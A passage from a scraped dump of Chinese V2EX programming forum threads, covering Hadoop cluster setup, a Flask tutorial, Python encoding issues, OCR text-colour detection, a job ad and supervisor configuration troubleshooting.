文件夹\r<br>配置环境变量\r<br>[root@hadoop100 local]# vi /etc/profile 在最后面加上下面两行\r<br>export JAVA_HOME=/usr/local/jdk1.6.0_30 \r<br>export PATH=.:$JAVA_HOME/bin:$PATH\r<br>保存退出\r<br>[root@hadoop100 local]# source /etc/profile 使新修改的环境变量生效。\r<br> \r<br>验证： java -version\r<br>\r<br>\r<br>五、下载并解压 hadoop 安装包（仅对 hadoop100 操作）\r<br> \r<br>5.1 解压 hadoop 并重命名\r<br> \r<br>使用 root 用户进行以下操作\r<br>tar -zxvf /usr/local/hadoop-1.1.2.tar.gz  \r<br>解压后生成文件夹 hadoop-1.1.2 。\r<br>重命名   mv hadoop-1.1.2 hadoop\r<br> \r<br>5.2 修改权限，使得 hadoop 用户可以操作 hadoop 文件夹\r<br> \r<br>chown -R hadoop /usr/local/hadoop/ \r<br>chgrp -R hadoop /usr/local/hadoop/\r<br> \r<br>5.3 设置 hadoop 环境变量\r<br> \r<br>vi /etc/profile\r<br>\r<br>修改为 \r<br>export JAVA_HOME=/usr/local/jdk1.6.0_30 \r<br>export HADOOP_HOME=/usr/local/hadoop \r<br>\r<br>export PATH=.:$HADOOP_HOME/bin:$JAVA_HOME/bin:$PATH\r<br>保存退出\r<br>source /etc/profile\r<br> \r<br>验证： hadoop\r<br> \r<br>\r<br>六、设置 hadoop 参数\r<br>进入 usr/local/hadoop/conf 文件夹，即可看到以下文件\r<br>6.1 配置 hadoop-env.sh\r<br> \r<br>找到 export JAVA_HOME 这一行，去除前面的#号注释符。\r<br>修改 export JAVA_HOME=/usr/local/jdk1.6.0_30\r<br> \r<br>6.2 配置 core-site.xml\r<br> \r<br>&lt;configuration&gt; \r<br>    &lt;property&gt; \r<br>&lt;name&gt;fs.default.name&lt;/name&gt; \r<br>&lt;value&gt;hdfs://hadoop100:9000&lt;/value&gt; \r<br>&lt;description&gt;change your own hostname&lt;/description&gt; \r<br>    &lt;/property&gt; \r<br>    &lt;property&gt; \r<br>&lt;name&gt;hadoop.tmp.dir&lt;/name&gt; \r<br>&lt;value&gt;/home/hadoop/tmp&lt;/value&gt; \r<br>    &lt;/property&gt;  \r<br>&lt;/configuration&gt;\r<br> \r<br>6.3 配置 hdfs-site.xml\r<br> \r<br>&lt;configuration&gt; \r<br>   &lt;property&gt; \r<br>&lt;name&gt;dfs.replication&lt;/name&gt; \r<br>&lt;value&gt;2&lt;/value&gt; \r<br>   &lt;/property&gt; \r<br>&lt;/configuration&gt;\r<br> \r<br>6.4 配置 mapred-site.xml\r<br> \r<br>&lt;configuration&gt; \r<br>    &lt;property&gt; \r<br>&lt;name&gt;mapred.job.tracker&lt;/name&gt; \r<br>&lt;value&gt;hadoop100:9001&lt;/value&gt; \r<br>&lt;description&gt;change your own hostname&lt;/description&gt; \r<br>    &lt;/property&gt; \r<br>&lt;/configuration&gt;\r<br> \r<br>6.5 配置 masters 文件\r<br> \r<br>将 masters 里的 localhost 改成 hadoop100\r<br> \r<br>6.6 配置 slaves 文件\r<br> \r<br>将 slaves 里的 localhost 改成\r<br>hadoop101\r<br>hadoop102\r<br> \r<br>\r<br>七、向其他机器复制 jdk 以及 hadoop 和一些配置\r<br> \r<br>7.1 分发 hosts 到其他机器(root 用户)\r<br> \r<br>scp -r /etc/hosts root@hadoop101:/etc/ \r<br>scp -r /etc/hosts root@hadoop102:/etc/\r<br> \r<br>7.2 分发 java(root 用户)\r<br> \r<br>scp -r /usr/local/jdk1.6.0_30 root@hadoop101:/usr/local/ \r<br>scp -r /usr/local/jdk1.6.0_30 root@hadoop102:/usr/local/\r<br> \r<br>7.3 分发环境变量 /etc/profile(root 用户)\r<br> \r<br>scp -r /etc/profile root@hadoop101:/etc/ \r<br>scp -r /etc/profile root@hadoop102:/etc/\r<br> \r<br>分别通过 ssh 远程登录其他电脑\r<br>执行 source /etc/profile  \r<br>分别验证： java -version \r<br>ping hadoop101 \r<br>ping hadoop100\r<br> \r<br>7.4 分发 hadoop(root 用户)\r<br> \r<br>scp -r /usr/local/hadoop/ root@hadoop101:/usr/local/hadoop/ \r<br>scp -r /usr/local/hadoop/ root@hadoop102:/usr/local/hadoop/\r<br>再通过 ssh 远程登录其他电脑修改 hadoop 权限，如 5.2 所示。\r<br>再分别验证： hadoop\r<br> \r<br>\r<br>八、格式化 hdfs\r<br>在 hadoop100 ， hadoop101, hadoop102 的 hadoop 用户下 \r<br>执行命令 hadoop namenode -format \r<br> \r<br>\r<br>九、启动 hadoop\r<br>在 hadoop100 上执行 start-all.sh\r<br>用 jps 检验\r<br>hadoop100 上有\r<br>32387 Jps\r<br>32283 JobTracker\r<br>32198 SecondaryNameNode\r<br>32021 NameNode\r<br>hadoop101 和 hadoop102 上有\r<br>30770 TaskTracker\r<br>30866 Jps\r<br>30666 DataNode\r<br>说明运行成功，。，这时你可以运行个 wordcount 这个小例子体验一下</div>"], "reply": "4", "tittle": "9 个步骤教你搭建 Hadoop 完全分布式", "comment": ["无图言 D", "hadoop 关 python 毛事", "这个版本太旧了啊 ", " ", "现在架个服务都能变成教程。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.v2ex.com/t/354262#reply0\" rel=\"nofollow\">从零开始用 Flask 搭建一个网站（二）</a> 介绍了有关于数据库的运用，接下来我们在完善一下数据在前端以及前端到后端之间的交互。本节涉及到前端，因此也会讲解一下 jinja2 模板、 jQuery 、 ajax 等用法。</p>\n<p>下面我们来创建两个界面，一个可以新建 channel ，并显示，另一个可以创建 integration ，并且可以绑定一个之前创建的 channel 。</p>\n<blockquote>\n<p>post2channel.html</p>\n</blockquote>\n<pre><code>{% extends \"base.html\" %}\n{% import \"bootstrap/wtf.html\" as wtf %}\n\n{% block head %}    \n{{ super() }}    \n&lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='css/post2channel.css') }}\"&gt;    \n&lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='css/toastr.css') }}\"&gt;    \n&lt;script type=\"text/javascript\" src=\"{{ url_for('static', filename= 'js/jquery.min.js') }}\"&gt;&lt;/script&gt;    \n&lt;script type=\"text/javascript\" src=\"{{ url_for('static', filename='js/toastr.js') }}\"&gt;&lt;/script&gt;    \n&lt;script type=\"text/javascript\" src=\"{{ url_for ('static', filename='js/')}}\"&gt;&lt;/script&gt;\n{% endblock %}\n\n{% block title %}极光宝盒-创建集成{% endblock %}\n{% block navbar %}    \n&lt;div id=\"navigationbar\"&gt;&lt;/div&gt;    \n{{ super() }}\n{% endblock %}\n\n...\n</code></pre>\n<p>我们从第一行开始来讲解一下这个模板，第一句</p>\n<pre><code>{% extends \"base.html\" %}\n</code></pre>\n<p>从字面上可以明白这个模板继承了 base.html 模板，使用 {% %} 是 <a href=\"http://docs.jinkan.org/docs/jinja2/\" rel=\"nofollow\">jinja2</a> 模板的语法，表示语句块，还有一种分隔符 {{ }} ，表示变量，通常用来在模板上显示。接下来是</p>\n<pre><code>{% block head %}\n</code></pre>\n<p>可以看到也是比较容易理解的语法， block 后接一个 block name ，表示一个块开始的声明，结束的时候用 {% end %} 即可。在块中可以使用普通的 HTML 语法。{{ super() }} 表示继承父模板的块声明，这里指继承 base.html 中声明的 head 块。接下来是 css 和 js 文件的引用。此页面使用了 <a href=\"https://github.com/CodeSeven/toastr\" rel=\"nofollow\">toastr</a> 来显示通知，类似于 Android 中的 Toast ，有兴趣的可以了解一下它的详细用法。</p>\n<p>接下来是 HTML 代码，有一个下拉输入框和按钮。</p>\n<pre><code>&lt;ul id=\"content\" class=\"dropdown-menu dropdown-menu-right\"&gt;    \n  {% for channel in channels %}        \n    &lt;li id=\"{{ channel }}\" class=\"channel_class\"&gt;&lt;a&gt;{{ channel }}&lt;/a&gt;&lt;/li&gt;    \n  {% endfor %}\n&lt;/ul&gt;\n</code></pre>\n<p>以上代码就是下拉输入框中的数据来源，用了一个 for 循环来遍历 channels 列表，并且用 li 包裹每个元素，这也是模板常见的用法。 channels 是在视图函数中传过来的。</p>\n<blockquote>\n<p>auth/<a href=\"http://views.py\" rel=\"nofollow\">views.py</a></p>\n</blockquote>\n<pre><code>@auth.route('/new/post_to_channel', methods=['GET'])\ndef post_to_channel():    \n  developer = get_developer()    \n  dev_key = developer.dev_key    \n  channels = get_channel_list()    \n  return render_template('auth/new/post2channel.html', **locals())\n</code></pre>\n<p>remder_template 的第二个参数表明，渲染这个 post2channel.html 页面的时候，把以上所有的变量都传递到页面中，这样就可以使用 {{ }} 模板语法拿到。接下来回到 post2channel.html ， 看到&lt;script&gt;&lt;/script&gt;部分：</p>\n<pre><code>$('#create_integration_btn').click(function () {    \n  var channel = $('#selected_channel').val();   \n  console.log('create integration, channel: ' + channel);    \n  if (channel != '') {        \n    $.ajax({            \n    type: \"POST\",            \n    contentType: \"application/json; charset=utf-8\",            \n    url: \"../../v1/developers/{{ dev_key }}/integrations\",            \n    data: JSON.stringify({channel: channel}),            \n    success: function (data) {                \n      if (data != undefined) {                    \n        if (data[\"token\"]) {                       \n          window.location.href = '/auth/manage/create_integration/' + data[\"integration_id\"] + '/' + data[\"token\"] + '/' + channel                    \n        }                \n      } else {                    \n        toastr.error(\"服务器异常\");                \n      }            \n    },            \n      error: function (error) {                \n        console.log(error);                \n        toastr.error(\"创建失败\");            \n      },            \n      dataType: \"json\"        \n    })    \n  }\n})\n</code></pre>\n<p>这是创建集成按钮的逻辑，用 jQuery 的 ajax 发送 post 请求，以 json 格式将输入框中的 channel 值传到 url 表明的视图函数。这里的 url 是相对路径。在 ajax 中有 success 和 error 两个函数，分别是请求成功和失败的回调函数。下面看到这个请求的视图函数，我们来看看视图函数是如何处理从页面传过来的数据。</p>\n<blockquote>\n<p>api_1_0/<a href=\"http://developers.py\" rel=\"nofollow\">developers.py</a></p>\n</blockquote>\n<pre><code># 添加一个集成，并返回 integration_id ，如果 channel 已存在，直接绑定该 channel ， 否则新建一个 channel@api.route('/developers/&lt;dev_key&gt;/integrations', methods=['POST'])\ndef create_integrations(dev_key):\n# 先判断一下传过来的 json 数据是否符合要求\n  if not request.json or not 'channel' in request.json:    \n    print(\"request json error\")    \n    abort(400)\n#从数据库得到 developer\n  developer = Developer.query.filter_by(dev_key=dev_key).first()\n  if developer is None:    \n    print(\"developer not found\")    \n    abort(400)\n  #以下省略\n  ...\n  #最后返回相关数据\n  return jsonify({'integration_id': new_integration_id,                \n                  'token': token.decode('utf-8')}), 201\n</code></pre>\n<p>以上代码创建成功后也返回了一个 json ，这样在 success 的回调函数中就能得到这个数据，用于在跳转到其他界面的时候做一些初始化操作。即以下代码：</p>\n<pre><code>if (data != undefined) { \n  if (data[\"token\"]) { \n    window.location.href = '/auth/manage/create_integration/' + data[\"integration_id\"] + '/' + data[\"token\"] + '/' + channel \n  } \n}\n</code></pre>\n<p>这里将参数放到 url 中，调用了对应的视图函数：</p>\n<blockquote>\n<p>auth/<a href=\"http://views.py\" rel=\"nofollow\">views.py</a></p>\n</blockquote>\n<pre><code>@auth.route('/manage/create_integration/&lt;string:integration_id&gt;/&lt;string:token&gt;/&lt;string:channel&gt;', methods=['GET', 'POST'])\ndef create_integration(integration_id, token, channel):    \n  integration = Integration.query.filter_by(integration_id=integration_id).first()    \n  channels = get_channel_list()    \n  developer = get_developer()    \n  dev_key = developer.dev_key    \n  return render_template('auth/create.html', **locals())\n</code></pre>\n<p>可以看到上面的参数就是从 post2channel 页面传过来的，并且还从数据库中查询到对应的 integration ，然后将相关数据传到 create.html ，让后者渲染页面。</p>\n<p>我们通过一个例子看到数据在前端和后端、前端之间的交互。总结一下，无非就是在前端页面中发送请求，然后在视图函数中操作数据库，并且返回相关数据，回调到前端页面中，最后在回调中调用另一个视图函数，在跳转页面时利用得到的数据渲染页面。一切就是这么简单，没什么黑魔法！<a href=\"https://github.com/jpush/jbox/tree/dev/Server\" rel=\"nofollow\">源码在 github 上</a>。下一节介绍一下 flask_oauthlib 的用法，学习一下如何使用 oath2 第三方授权登录以及调用提供方的相关 API 。</p>\n<hr>\n<blockquote>\n<p>作者： KenChoi - 极光（ JPush 为极光团队账号，欢迎关注）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/dfff20a774aa\" rel=\"nofollow\">从零开始用 Flask 搭建一个网站（三）</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "目前尚无回", "tittle": "从零开始用 Flask 搭建一个网站（三）", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，天天看着不知道咋读，太别扭了。</p>\n</div></div>"], "reply": "29", "tittle": "jupyter 怎么读", "comment": ["朱庇特", "\r", "直接自己听吧，下次不会读就看看介绍，他们总要读出来的。", "可能上面的发音不好，多找几个听听。", "绝逼特", "猪皮特", " 放一个印度发音的……\r", "过马路老太太我都不扶，就服你！", "就皮特", "旧派得~   美式弹舌音 （逃..", "赞同 5 楼，反正我是这么读", "我读猪皮特儿～", "真正的标准发音来了 [ˈdʒupɪtɚ]", "去搜搜“木星”的英文单词吧", " 我故意的，哈哈。", "猪排特", "mac cmd: say jupyter", "所有用中文注音的终究会害了你。\r", "\r", "\r", "\r", "/ˈdʒuːpɪtə(r)/ 其实也没问题。", "听歌\r", "fly me to the moon", "木星的英语怎么念这就怎么念。\r", "就类似于孤岛危机的英语 Crysis -> 源自于危机的英语： Crisis", "Jupiter", "Jupiter 朱庇特", "Petyr Baelish 怎么念 :)", "已重命名 ipython, 这个拼写起来反人类的", "ju pi ter", "就按 Jupiter 来读，错不了", " 培提尔·贝里席 ;)", "猪 ugg", "osx 上直接 say jupyter ，发音莫名喜感。", "猪排特", " say meow"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>情形 1 ： LC_ALL=\"en_US.UTF-8\"</p>\n<p>&gt;&gt;&gt;i=u'呵呵'</p>\n<p>&gt;&gt;&gt;i</p>\n<p>u'\\u5475\\u5475'</p>\n<p>&gt;&gt;&gt;i.encode('utf-8')</p>\n<p>'\\xe5\\x91\\xb5\\xe5\\x91\\xb5'</p>\n<p>&gt;&gt;&gt;type(i)</p>\n<p>&lt;type 'unicode'&gt;</p>\n<p>情形 2 ： LC_ALL=C</p>\n<p>&gt;&gt;&gt; i=u'呵呵'</p>\n<p>&gt;&gt;&gt; i</p>\n<p>u'\\xe5\\x91\\xb5\\xe5\\x91\\xb5'  #这是什么鬼？？</p>\n<p>&gt;&gt;&gt; type(i)</p>\n<p>&lt;type 'unicode'&gt;</p>\n<p>&gt;&gt;&gt; i.encode('utf-8')</p>\n<p>'\\xc3\\xa5\\xc2\\x91\\xc2\\xb5\\xc3\\xa5\\xc2\\x91\\xc2\\xb5'</p>\n<p>唯一的区别就是 LC_ALL 了，所以谁能详细解释下这个编码与 LC_ALL 的关系呢。</p>\n</div></div>", "<div class=\"topic_content\">来结个贴。。\r<br>以前确实没太仔细研究编码和 export 出得 LC_*系列参数 昨晚仔细 Google 了一遍。\r<br>\r<br>1 、查看系统默认编码 sys.getdefaultencoding( ) 一般为 ascii\r<br>\r<br>2 、在终端获取系统的输入、输出编码格式  sys.stdin.encoding   sys.stdout.encoding 正常应该为 utf-8  设置方法为 export PYTHONIOENCODING=UTF-8\r<br>\r<br>3 、 u ’中文’=‘中文’.decode(encode)\r<br>        此处 encode 值为 sys.stdin.encoding\r<br>     所以当为 utf-8 时 '中文'.decode('utf-8 ’)=u'\\u4e2d\\u6587 ’\r<br>     当为 ASCII 时 '中文'.decode('ISO-8859-1 ’)=u'\\xe4\\xb8\\xad\\xe6\\x96\\x87 ’\r<br>\r<br>4 、 os.path.exists(path) 当 path 里有中文路径时，尽量转成 utf-8 后再和英文路径相加\r<br>\r<br>5 、 print 输出时候尽量要 encode(‘ utf-8 ’)\r<br>\r<br><a target=\"_blank\" href=\"https://wiki.archlinux.org/index.php/Locale_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\" rel=\"nofollow\">https://wiki.archlinux.org/index.php/Locale_(简体中文)</a>\r<br>\r<br><a target=\"_blank\" href=\"https://segmentfault.com/a/1190000004357933\" rel=\"nofollow\">https://segmentfault.com/a/1190000004357933</a>\r<br>\r<br><a target=\"_blank\" href=\"http://www.w2bc.com/article/216391\" rel=\"nofollow\">http://www.w2bc.com/article/216391</a>\r<br>\r<br><a target=\"_blank\" href=\"http://stackoverflow.com/questions/2596714/why-does-python-print-unicode-characters-when-the-default-encoding-is-ascii\" rel=\"nofollow\">http://stackoverflow.com/questions/2596714/why-does-python-print-unicode-characters-when-the-default-encoding-is-ascii</a>\r<br>\r<br><a target=\"_blank\" href=\"http://blog.csdn.net/liuyukuan/article/details/50855748\" rel=\"nofollow\">http://blog.csdn.net/liuyukuan/article/details/50855748</a></div>"], "reply": "4", "tittle": "Python 编码和系统编码问题。", "comment": ["→python3", ".decode('gbk')", "我认为是你输入的值有了问题，不然你看看 len(i) 是怎样？", "快转换到 python3 吧，别在编码问题上死磕了"]},
{"content": ["<div class=\"topic_content\">*公司介绍* \r<br>\r<br>厚建云计算在 2015 年，依托于厚建软件技术储备，借移动互联网爆发趋势，剥离出原核心团队优质人才资源，基于云计算技术孵化出“叮当”和“秀赞”两大面向大众用户的云服务产品。 \r<br>主打叮当秀赞两个拳头产品，覆盖手机 app 及 H5 应用的制作及运营需求，让普通人也可以轻松做出手机 app 、最高质的 H5 营销应用。 \r<br>公司网址： <a target=\"_blank\" href=\"http://www.hogecloud.com\" rel=\"nofollow\">www.hogecloud.com</a> \r<br>\r<br>*福利环境* \r<br>\r<br>每天下午茶 /零食+双休 \r<br>五险一金+每年一次大体检 \r<br>团建旅游+年终奖 \r<br>除此之外， \r<br>还有…… \r<br>高大上的环境、精英团队、俊男美女 \r<br>\r<br>\r<br>*岗位介绍* \r<br>\r<br>您将从事： \r<br>\r<br>1 、 主要参与叮当项目的服务端开发； \r<br>2 、 根据产品的需求提供符合项目或产品的解决方案； \r<br>3 、 参与平台日常开发，包括但不限于程序设计审查、代码审查等工作； \r<br>4 、 编写程序设计、 API 等相关技术文档。 \r<br>我们希望您具备以下条件： \r<br>\r<br>1 、大专以上学历， 2 年以上 Python 相关工作经验，熟练使用 Python 语言。 \r<br>2 、熟悉 Linux 常用命令或有 Mac 下的开发经验，能在常见 Linux 服务器（ CentOS/Ubuntu ）上简单排查问题； \r<br>3 、熟练使用 MySQL/Postgres ，了解 NoSQL ； \r<br>4 、熟悉 Nginx/Apache 等 Web 服务器的配置； \r<br>5 、有良好的需求分析、设计能力、规范的编程风格和良好文档习惯； \r<br>6 、至少精通一种 Python 框架（ Django/Tornado ）。 \r<br>\r<br>能者高薪，只要你有那个实力！ \r<br>动次打次，动次打次… \r<br>是不是心动到不行了， \r<br>那还不赶紧把 \r<br>你的简历 \r<br>发 ( za ) 给 ( guo ) 我 ( lai ) !!! \r<br>\r<br>简历收件邮箱： <a target=\"_blank\" href=\"mailto:maxiaoxuan@hoge.cn\">maxiaoxuan@hoge.cn</a></div>"], "reply": "2", "tittle": "诚聘一名 2 年经验以上的 Python 工程师，坐标广州。", "comment": ["招不招实习啊？", " 不好意思，不招哦。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位好，最近小弟遇到一个问题，就是怎么识别一张图片上文字的颜色，我目前的解决方法如下：</p>\n<p>首先使用 ocr 工具先在图片上找出一行文本，然后把这一行文本中的每个文字都切片，然后对每个切片抽取 5 个颜色，选择占面积最大的颜色作为该切片上的文字颜色，但是因为一张图片上文字的颜色可能不一样，我这里只是想抽取一种颜色，所以我就把所有切片的文字颜色综合起来，找出其中出现数量最多的颜色，并把这个颜色作为该张图片的文字颜色。</p>\n<p>以上就是我的方法，但是很耗时间，各位老铁有什么更好的方法吗？</p>\n</div></div>"], "reply": "24", "tittle": "老铁！怎么识别一张图片上文字的颜色", "comment": ["文字背景色是纯色么？你的方法能排除文字背景色么？觉得直接对文字部分位图数组遍历，排除掉背景色像素值，剩下前景色求颜色平均值，效率应该不会很差吧。", " 文字背景不一定是纯色的，但是使用 ocr 选中每一个颜色的框框里按道理来说文字所占的颜色面积最大，这是我的依据。直接排除背景色像素值，因为是这样，我会对 ocr 识别出的文字图片抽取 5 个颜色，所以现在就不知道哪个是背景哪个是前景，如果默认面积大的就是背景的话会有问题", "  我给你看看我这边做出来的效果吧，黑色是 0 ，也就是非文字，白色是 1 ，也就是文字颜色\r", "![]( ", " )\r", "![]( ", " )", "我没有细想，你的黑白图哪来的？是 ocr 结果么？如果原图和黑白图大小一样，剩下的就是让程序读取原图在黑白图中为白色的部分。", "  黑白图是我用我上面说的方法自己做出来的效果，我这个方法是可以识别出部分文字颜色的，但是很耗时间，大概一张图要 1min+，所以想问下有没有更好的方法", "有相关软件，叫什么 pickup colour 什么的", " 你说的是那种取色工具吗？我这里想实现完全自动化，让计算机识别文字颜色，中间不需要人为干预的那种 233", "可以先把颜色从 RGB 转换成 HSV ，然后直接判断图片的颜色“角度”就可以了。\r", "\r", "如果用 OpenCV 的话，可以考虑 cvtColor, InRange 两个函数，应该可以直接得到红色文字了。", " 没有用过 opencv ，你这个方法是指针对某个颜色的文字吗？假设文字的颜色有多种呢？我这里用的颜色通道是 LAB ，你说的颜色角度是啥？", "如果有 ocr 工具的源代码，直接识别文字的时候顺带拿一下颜色应该最效率……", "找特征点,遍历特征点找出现最多次的颜色.", "补充一下,遍历特征点附近的 8*8 色块,找出现最多次的颜色", " HSV 的颜色是用角度标识的， H 通道，在 openCV 里面范围是 0-180 。比如，红色是 0-10 和 160-180 ，蓝色大概是 35-55 ，等等，还可以区分绿色，紫色，青色等等。", "好奇楼上，换成 HSV 颜色空间就能区分出字上的像素和背景像素？", "我的思路： 1 ）缩放到一个合适的比例再处理（怎么会一张图片几分钟……）； 2 ）边缘提取； 3 ）细化边缘（用腐蚀？）； 3 ）求边缘像素的颜色众数。\r", "\r", "细化边缘是因为字体和背景过渡的地方（很可能）反锯齿了。", "或许应该用“线提取”而不是“边缘提取”。", " 他的意思是，转换成 HSV 后，颜色信息就只包含在一个通道内，检查这一个通道就可以判断颜色。如果是 RGB 的话，颜色信息就分散到三个通道内了。", " @", " 原来如此，这个我倒是没有想到，但是我想了一下，如果只是换一下颜色空间的话貌似还是没解决我的问题，不过我试试 hsv 套在我的方法上会不会好点，谢谢两位", " 哎呀，我忘了缩放了，，你说的边缘提取这种需要先把图像二值化了把，但是不知道文字颜色的话如何二值化，咋设置 thresh ，我试过把一张图灰度化，然后二值化图像连通域分析，但是通常如果图像背景是深色，前景是淡色的话会有用，遇上背景是白色字是黑色这种情况就不行了，因为我二值化的时候都是把 thresh 设成 0.5 ，偏白色大部分会被二值化为 1 ，所以效果有限。也不知道 ocr 中识别文字区域的那一步是咋做的，我找找代码好了，谢谢老铁", "OCR 选区建立的时候普遍就是根据颜色。\r", "类似 PS 中的选择色彩范围。", " 边缘提取不能二值化啊 ==（只有两种像素还提取啥啊 ==）。通常先处理成灰度倒是真的。", "你都得 OCR 的结果了，直接对结果进行边缘检测就能提取边缘了，干净有效。或者用 OCR 结果与原图逐个像素进行与运算，相当于抠图把文字从原图里抠出来，然后马赛克化，再从 HSV 通道统计颜色信息。", "理论上来说，统计个颜色不会很慢，跑 1min 太夸张了", " @", " \r", "我根据两位的思路做了一个 ocr 的前期的文字区域识别的方法，但是有点问题，先给你们看下效果图：\r", "![]( ", " )\r", "![]( ", " )\r", "![]( ", " )\r", "但是有个问题，在前期选区的时候需要对图像进行斑点检测，然后生成二值化图像，问题就出在二值化图像这里，阈值不好选，跟文字的颜色和文字所在背景的颜色有很大的关系，以下是检测出错的：\r", "![]( ", " )\r", "两位老哥有啥建议不", " 对哦，我试试，谢谢啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>为了监控 elasticsearch 死掉后，能自动重启，网上查了下,supervisor 可以实现这个要求，以下是配置：\n[program=sticsearch]\ncommand=/usr/share/elasticsearch/bin/elasticsearch\nautostart=true\nautorestart=true\nstdout_logfile=/home/demoer/log/elasticsearch/elasticsearch-stdout.log\nstderr_logfile=/home/demoer/log/elasticsearch/elasticsearch-stderr.log\nstartsecs=5</p>\n<p>我把这个直接写在 supervisor.conf ，在启动 supervisorctl reload, reread, update,都说没有找到配置（ No config updates to processes ）。\n我用 include_file 单独来引入，也是同样的结果。\n请问下配置代码是否正确呢？</p>\n</div></div>"], "reply": "14", "tittle": "请教下 supervisor 配置的问题", "comment": ["得重启 supervisor 服务…", "supervisord -c /etc/supervisord.conf\r", "\r", "[root tmp]# ps aux | grep supervisord\r", "root     10926  0.0  0.3 220120 11836 ?        Ss   Apr14   0:11 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     12554  0.0  0.2 217092 10664 ?        Ss   Apr14   0:10 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     12564  0.0  0.2 217128 10716 ?        Ss   Apr14   0:10 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     12575  0.0  0.2 217280 10824 ?        Ss   Apr14   0:11 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     12764  0.0  0.2 219728 11464 ?        Ss   Apr14   0:11 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     13844  0.0  0.2 217588 11164 ?        Ss   00:11   0:05 /usr/bin/python /usr/bin/supervisord\r", "root     14070  0.0  0.2 216964  9828 ?        Ss   01:00   0:04 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     14117  0.0  0.2 217144 10644 ?        Ss   01:02   0:04 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     14128  0.0  0.2 217520 11144 ?        Ss   01:04   0:04 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     14936  0.0  0.2 216960  9832 ?        Ss   08:07   0:00 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.conf\r", "root     14938  0.0  0.0 112648   960 pts/0    S+   08:07   0:00 grep --color=auto supervisord\r", "\r", "[root tmp]# supervisorctl\r", "supervisor> reload\r", "Really restart the remote supervisord process y/N? y\r", "Restarted supervisord\r", "supervisor> reread\r", "No config updates to processes\r", "supervisor> update\r", "supervisor> status\r", "supervisor> \r", "\r", "已经重启过很多次，还是一样的结果。\r", "\r", "下面是 supervisor.conf 和 elasticsearch.conf 的配置内容。\r", "\r", "supervisor.conf:\r", "\r", "[include]\r", "files = /etc/supervisord/conf.d/elasticsearch.conf\r", "\r", "elasticsearch.conf:\r", "\r", "[program=sticsearch]\r", "command=systemctl restart elasticsearch.service\r", ";command=/usr/share/elasticsearch/bin/elasticsearch\r", ";directory=/usr/share/elasticsearch\r", "autostart=true\r", "autorestart=true\r", "startsecs=10\r", "startretries=3\r", "redirect_stderr=true\r", "user=root\r", "stdout_logfile=/home/public/log/elasticsearch/elasticsearch-stdout.log\r", "stderr_logfile=/home/public/log/elasticsearch/elasticsearch-stderr.log", "主配置里面默认会包含所有 conf.d 下面的 conf 后缀文件 回头我看看我的配置", " 我安装完 supervisor 后，在 etc 下面没有 /etc/supervisord 文件夹的，我是自己创建的 /etc/supervisord/con.d/文件夹，然后把 elasticsearch.conf 放在里面。", "恩 看起来没啥错，我的 centos6.8 安装后，主文件是 包括如下两行\r", "\r", "[include]\r", "files = /etc/supervisor.d/*.conf\r", "\r", "你的配置看起来也没啥问题的，要不试试\r", "ls  /etc/supervisord/conf.d/elasticsearch.conf   \r", "看看这个文件是不是真正的存在呢？ 不存在的概率可能比较小，不过工作中经常会遇到这种情况，呵呵。", " 文件是存在的。郁闷。。一直找不到原因。", "  既然文件已经加载了，怀疑还是配置的问题， \r", "1. 是不是配置的 program 名字有冲突？\r", "2. 打开界面，可能更一目了然\r", "\r", "在 supervisord.conf 开头加上或者修改如下，打开 http ，一目了然\r", "\r", "[unix_http_server]\r", "file=/tmp/supervisor.sock   ; (the path to the socket file)\r", "[inet_http_server]         ; inet (TCP) server disabled by default\r", "port=0.0.0.0:1009       ; (ip_address:port specifier, *:port for all iface)\r", "username=ops              ; (default is no username (open server))\r", "password=123123             ; (default is no password (open server))", "  我大概知道了， supervisor 在执行命令的时候要求比较苛刻，比如全路径呀，环境变量报错呀啥的， 刚刚的 http 页面可以让你看到\r", "1. elasticsearch 进程是否配置到 supervisord\r", "2. 启动情况如何，是 ok 还是 fail\r", "3. 瞅瞅 log 里面有啥吧", " supervisord.conf 用的是默认设置，我没修过过。\r", "\r", "[unix_http_server]\r", "file=/tmp/supervisor.sock   ; (the path to the socket file)\r", "chmod=0777                 ; socket file mode (default 0700)\r", ";chown=nobody:nogroup       ; socket file uid:gid owner\r", ";username=user              ; (default is no username (open server))\r", ";password=123               ; (default is no password (open server))\r", "\r", ";[inet_http_server]         ; inet (TCP) server disabled by default\r", ";port=127.0.0.1:9001        ; (ip_address:port specifier, *:port for all iface)\r", ";username=user              ; (default is no username (open server))\r", ";password=123               ; (default is no password (open server))\r", "\r", "supervisord.log\r", "\r", "2017-04-15 08:08:21,706 INFO RPC interface 'supervisor' initialized\r", "2017-04-15 08:08:21,706 CRIT Server 'unix_http_server' running without any HTTP authentication checking\r", "2017-04-15 08:08:21,707 INFO supervisord started with pid 14936\r", "2017-04-15 08:43:04,969 CRIT Supervisor running as root (no user in config file)\r", "2017-04-15 08:43:04,969 INFO Included extra file \"/etc/supervisord/conf.d/elasticsearch.conf\" during parsing\r", "2017-04-15 08:43:04,980 INFO RPC interface 'supervisor' initialized\r", "2017-04-15 08:43:04,980 CRIT Server 'unix_http_server' running without any HTTP authentication checking\r", "2017-04-15 08:43:04,981 INFO daemonizing the supervisord 